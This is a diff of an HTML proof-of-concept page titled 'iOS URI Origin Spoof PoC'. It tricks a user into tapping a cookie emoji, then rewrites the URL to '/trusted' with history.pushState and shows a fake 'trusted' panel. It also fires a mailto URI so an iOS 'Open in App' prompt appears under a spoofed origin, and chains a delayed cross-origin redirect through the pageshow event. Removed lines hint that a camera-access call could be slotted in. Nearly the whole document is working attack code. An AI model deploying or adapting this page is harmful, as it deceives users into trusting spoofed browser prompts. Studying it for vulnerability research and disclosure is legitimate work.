@@ -2,13 +2,14 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>iOS Gesture Confusion PoC</title>
+<title>iOS URI Origin Spoof PoC</title>
 <style>
-  #cookie {
+  #trigger {
     font-size: 40px;
     position: absolute;
-    left: 120px;
     top: 120px;
+    left: 120px;
+    cursor: pointer;
   }
   #panel {
     display: none;
@@ -21,38 +22,41 @@
   }
 </style>
 </head>
-
 <body>
-Tap cookie as fast as possible 🍪
-<div id="cookie">🍪</div>
 
-<div id="panel">
-  Loading trusted page…
-</div>
+Tap here 🍪
+<div id="trigger">🍪</div>
+<div id="panel">Trusted panel opened…</div>
 
 <script>
-const trigger = document.getElementById("cookie");
+const trigger = document.getElementById("trigger");
 const panel = document.getElementById("panel");
 
-/* USER GESTURE */
-trigger.addEventListener("touchstart", () => {
+trigger.addEventListener('touchstart', () => {
+  // Change URL in Private mode (origin spoof)
   history.pushState({}, '', '/trusted');
+
+  // Show fake panel to increase perceived trust
   panel.style.display = 'block';
 
-  // privileged API can be placed here if needed
-  // navigator.mediaDevices.getUserMedia({ video: true });
+  // Simulate external app launch via location.href
+  // On iOS, user will see "Open in App" prompt
+  setTimeout(() => {
+    window.open('mailto:test@example.com');  // runnable URI
+  }, 0);
 });
 
-/* PAGE LIFECYCLE ABUSE */
+// Optional: delayed navigation after pageshow (like Android PoC)
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'https://google.com:9090';
+        location.href = 'https://example.com';  // cross-origin redirect
       }, 0);
     });
   });
 });
 </script>
+
 </body>
 </html>
